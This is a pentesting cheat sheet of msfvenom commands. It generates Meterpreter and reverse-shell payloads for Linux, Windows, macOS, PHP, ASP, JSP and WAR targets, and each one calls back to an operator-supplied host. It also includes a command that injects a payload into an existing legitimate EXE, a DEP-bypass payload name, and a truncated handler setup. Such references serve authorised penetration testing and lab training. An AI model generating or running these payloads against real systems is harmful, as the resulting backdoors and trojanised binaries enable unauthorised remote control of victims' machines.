---
id: 7f83f22d-23d9-4a68-b885-d63a93004bec
name: msfvenom
type: cheatsheet
verified: false
created_at: '2020-07-14T18:14:34.639206+00:00'
updated_at: '2023-05-29T16:48:52.690130+00:00'
---

# msfvenom

**Command** ([[Linux ELF binary]]):

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf

```

**Command** ([[Windows EXE binary]]):

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe

```

**Command** ([[32 Bit]]):

```bash
msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=10.10.12.XX lport=1337 -f exe > shell32.exe

```

**Command** ([[64Bit]]):

```bash
msfvenom -a x64 --platform Windows -p windows/x64/meterpreter/reverse_tcp lhost=10.10.12.XX lport=1337 -f exe > shell64.exe

```

**Command** ([[Windows Service]]):

```bash
msfvenom -p windows/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> EXITFUNC=thread -f exe-service > shell-service.exe

```

**Command** ([[Mac]]):

```bash
msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f macho > shell.macho

```

**Command** ([[PHP]]):

```bash
msfvenom -p php/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > /tmp/shell.php && sed -i 's/#<?php/<?php/' /tmp/shell.php

```

If you use php/reverse_php open the output file with an editor and add `<?php` and `?>` within the script.

**Command** ([[ASP]]):

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp

```

**Command** ([[JSP]]):

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.jsp

```

**Command** ([[WAR]]):

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war

```

**Command** ([[Inject payload into an existing exe file]]):

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -x <template EXE> -f exe > <output.exe>

```

**Command** ([[dep bypass payload]]):

```bash
windows/meterpreter/reverse_nonx_tcp

```

**Code**: [[
msfconsole
use exploit/multi/handler
set payload ]]
